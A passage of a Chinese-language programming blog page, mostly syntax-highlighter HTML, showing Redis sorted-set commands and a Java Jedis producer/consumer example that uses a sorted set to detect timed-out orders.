-->\r\n\r\n\t\t<div id=\"crayon-5b4aa930358c4652291978\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# 添加单个元素\r\n\r\nredis&gt; ZADD page_rank 10 google.com\r\n(integer) 1\r\n\r\n\r\n# 添加多个元素\r\n\r\nredis&gt; ZADD page_rank 9 baidu.com 8 bing.com\r\n(integer) 2\r\n\r\nredis&gt; ZRANGE page_rank 0 -1 WITHSCORES\r\n1) \"bing.com\"\r\n2) \"8\"\r\n3) \"baidu.com\"\r\n4) \"9\"\r\n5) \"google.com\"\r\n6) \"10\"\r\n\r\n# 查询元素的score值\r\nredis&gt; ZSCORE page_rank bing.com\r\n\"8\"\r\n\r\n# 移除单个元素\r\n\r\nredis&gt; ZREM page_rank google.com\r\n(integer) 1\r\n\r\nredis&gt; ZRANGE page_rank 0 -1 WITHSCORES\r\n1) \"bing.com\"\r\n2) \"8\"\r\n3) \"baidu.com\"\r\n4) \"9\"</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358c4652291978-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358c4652291978-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358c4652291978-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358c4652291978-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358c4652291978-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358c4652291978-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358c4652291978-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358c4652291978-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358c4652291978-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358c4652291978-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358c4652291978-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358c4652291978-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358c4652291978-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358c4652291978-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358c4652291978-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358c4652291978-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358c4652291978-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358c4652291978-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358c4652291978-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358c4652291978-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358c4652291978-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358c4652291978-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358c4652291978-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358c4652291978-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358c4652291978-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358c4652291978-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358c4652291978-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358c4652291978-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358c4652291978-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358c4652291978-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358c4652291978-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358c4652291978-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358c4652291978-33\">33</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa930358c4652291978-1\"><span class=\"crayon-p\"># 添加单个元素</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358c4652291978-2\"> </div><div class=\"crayon-line\" id=\"crayon-5b4aa930358c4652291978-3\"><span class=\"crayon-v\">redis</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ZADD </span><span class=\"crayon-v\">page</span><span class=\"crayon-sy\">_</span>rank<span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">google</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">com</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358c4652291978-4\"><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">integer</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358c4652291978-5\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358c4652291978-6\"> </div><div class=\"crayon-line\" id=\"crayon-5b4aa930358c4652291978-7\"><span class=\"crayon-p\"># 添加多个元素</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358c4652291978-8\"> </div><div class=\"crayon-line\" id=\"crayon-5b4aa930358c4652291978-9\"><span class=\"crayon-v\">redis</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ZADD </span><span class=\"crayon-v\">page</span><span class=\"crayon-sy\">_</span>rank<span class=\"crayon-h\"> </span><span class=\"crayon-cn\">9</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">baidu</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">com</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bing</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">com</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358c4652291978-10\"><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">integer</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358c4652291978-11\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358c4652291978-12\"><span class=\"crayon-v\">redis</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ZRANGE </span><span class=\"crayon-v\">page</span><span class=\"crayon-sy\">_</span>rank<span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">WITHSCORES</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358c4652291978-13\"><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"bing.com\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358c4652291978-14\"><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"8\"</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358c4652291978-15\"><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"baidu.com\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358c4652291978-16\"><span class=\"crayon-cn\">4</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"9\"</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358c4652291978-17\"><span class=\"crayon-cn\">5</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"google.com\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358c4652291978-18\"><span class=\"crayon-cn\">6</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"10\"</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358c4652291978-19\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358c4652291978-20\"><span class=\"crayon-p\"># 查询元素的score值</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358c4652291978-21\"><span class=\"crayon-v\">redis</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ZSCORE </span><span class=\"crayon-e\">page_rank </span><span class=\"crayon-v\">bing</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">com</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358c4652291978-22\"><span class=\"crayon-s\">\"8\"</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358c4652291978-23\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358c4652291978-24\"><span class=\"crayon-p\"># 移除单个元素</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358c4652291978-25\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358c4652291978-26\"><span class=\"crayon-v\">redis</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ZREM </span><span class=\"crayon-e\">page_rank </span><span class=\"crayon-v\">google</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">com</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358c4652291978-27\"><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">integer</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358c4652291978-28\"> </div><div class=\"crayon-line\" id=\"crayon-5b4aa930358c4652291978-29\"><span class=\"crayon-v\">redis</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ZRANGE </span><span class=\"crayon-v\">page</span><span class=\"crayon-sy\">_</span>rank<span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">WITHSCORES</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358c4652291978-30\"><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"bing.com\"</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358c4652291978-31\"><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"8\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358c4652291978-32\"><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"baidu.com\"</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358c4652291978-33\"><span class=\"crayon-cn\">4</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"9\"</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0030 seconds] -->\r\n<p>那么如何实现呢？我们将订单超时时间戳与订单号分别设置为score和member,系统扫描第一个元素判断是否超时，具体如下图所示</p>\n<div><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/f6e849e2a5f5f6a2346d8b3b10dfaccf.png\" alt=\"image\"></div>\n<h4 id=\"实现一\">实现一</h4>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa930358c7080832059\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\npackage com.rjzheng.delay4;\r\n\r\nimport java.util.Calendar;\r\nimport java.util.Set;\r\n\r\nimport redis.clients.jedis.Jedis;\r\nimport redis.clients.jedis.JedisPool;\r\nimport redis.clients.jedis.Tuple;\r\n\r\npublic class AppTest {\r\n    private static final String ADDR = \"127.0.0.1\";\r\n    private static final int PORT = 6379;\r\n    private static JedisPool jedisPool = new JedisPool(ADDR, PORT);\r\n    \r\n    public static Jedis getJedis() {\r\n       return jedisPool.getResource();\r\n    }\r\n    \r\n    //生产者,生成5个订单放进去\r\n    public void productionDelayMessage(){\r\n        for(int i=0;i&lt;5;i++){\r\n            //延迟3秒\r\n            Calendar cal1 = Calendar.getInstance();\r\n            cal1.add(Calendar.SECOND, 3);\r\n            int second3later = (int) (cal1.getTimeInMillis() / 1000);\r\n            AppTest.getJedis().zadd(\"OrderId\", second3later,\"OID0000001\"+i);\r\n            System.out.println(System.currentTimeMillis()+\"ms:redis生成了一个订单任务：订单ID为\"+\"OID0000001\"+i);\r\n        }\r\n    }\r\n    \r\n    //消费者，取订单\r\n    public void consumerDelayMessage(){\r\n        Jedis jedis = AppTest.getJedis();\r\n        while(true){\r\n            Set&lt;Tuple&gt; items = jedis.zrangeWithScores(\"OrderId\", 0, 1);\r\n            if(items == null || items.isEmpty()){\r\n                System.out.println(\"当前没有等待的任务\");\r\n                try {\r\n                    Thread.sleep(500);\r\n                } catch (InterruptedException e) {\r\n                    // TODO Auto-generated catch block\r\n                    e.printStackTrace();\r\n                }\r\n                continue;\r\n            }\r\n            int  score = (int) ((Tuple)items.toArray()[0]).getScore();\r\n            Calendar cal = Calendar.getInstance();\r\n            int nowSecond = (int) (cal.getTimeInMillis() / 1000);\r\n            if(nowSecond &gt;= score){\r\n                String orderId = ((Tuple)items.toArray()[0]).getElement();\r\n                jedis.zrem(\"OrderId\", orderId);\r\n                System.out.println(System.currentTimeMillis() +\"ms:redis消费了一个任务：消费的订单OrderId为\"+orderId);\r\n            }\r\n        }\r\n    }\r\n    \r\n    public static void main(String[] args) {\r\n        AppTest appTest =new AppTest();\r\n        appTest.productionDelayMessage();\r\n        appTest.consumerDelayMessage();\r\n    }\r\n    \r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358c7080832059-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358c7080832059-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358c7080832059-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358c7080832059-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358c7080832059-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358c7080832059-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358c7080832059-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358c7080832059-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358c7080832059-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358c7080832059-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358c7080832059-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358c7080832059-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358c7080832059-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358c7080832059-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358c7080832059-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358c7080832059-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358c7080832059-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358c7080832059-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358c7080832059-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358c7080832059-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358c7080832059-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358c7080832059-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358c7080832059-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358c7080832059-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358c7080832059-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358c7080832059-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358c7080832059-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358c7080832059-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358c7080832059-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358c7080832059-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358c7080832059-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358c7080832059-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358c7080832059-33\">33</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358c7080832059-34\">34</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358c7080832059-35\">35</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358c7080832059-36\">36</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358c7080832059-37\">37</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358c7080832059-38\">38</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358c7080832059-39\">39</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358c7080832059-40\">40</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358c7080832059-41\">41</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358c7080832059-42\">42</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358c7080832059-43\">43</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358c7080832059-44\">44</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358c7080832059-45\">45</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358c7080832059-46\">46</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358c7080832059-47\">47</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358c7080832059-48\">48</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358c7080832059-49\">49</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358c7080832059-50\">50</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358c7080832059-51\">51</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358c7080832059-52\">52</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358c7080832059-53\">53</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358c7080832059-54\">54</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358c7080832059-55\">55</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358c7080832059-56\">56</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358c7080832059-57\">57</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358c7080832059-58\">58</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358c7080832059-59\">59</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358c7080832059-60\">60</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358c7080832059-61\">61</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358c7080832059-62\">62</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358c7080832059-63\">63</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa930358c7080832059-1\"><span class=\"crayon-t\">package</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">rjzheng</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">delay4</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358c7080832059-2\"> </div><div class=\"crayon-line\" id=\"crayon-5b4aa930358c7080832059-3\"><span class=\"crayon-e\">import </span><span class=\"crayon-v\">java</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">util</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Calendar</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358c7080832059-4\"><span class=\"crayon-e\">import </span><span class=\"crayon-v\">java</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">util</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Set</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358c7080832059-5\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358c7080832059-6\"><span class=\"crayon-e\">import </span><span class=\"crayon-v\">redis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">clients</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">jedis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Jedis</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358c7080832059-7\"><span class=\"crayon-e\">import </span><span class=\"crayon-v\">redis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">clients</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">jedis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">JedisPool</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358c7080832059-8\"><span class=\"crayon-e\">import </span><span class=\"crayon-v\">redis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">clients</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">jedis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Tuple</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358c7080832059-9\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358c7080832059-10\"><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">class</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">AppTest</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358c7080832059-11\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">final</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ADDR</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"127.0.0.1\"</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358c7080832059-12\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">final</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">PORT</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6379</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358c7080832059-13\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">JedisPool </span><span class=\"crayon-v\">jedisPool</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">JedisPool</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">ADDR</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">PORT</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358c7080832059-14\"><span class=\"crayon-h\">    </span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358c7080832059-15\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Jedis </span><span class=\"crayon-e\">getJedis</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358c7080832059-16\"><span class=\"crayon-h\">       </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span 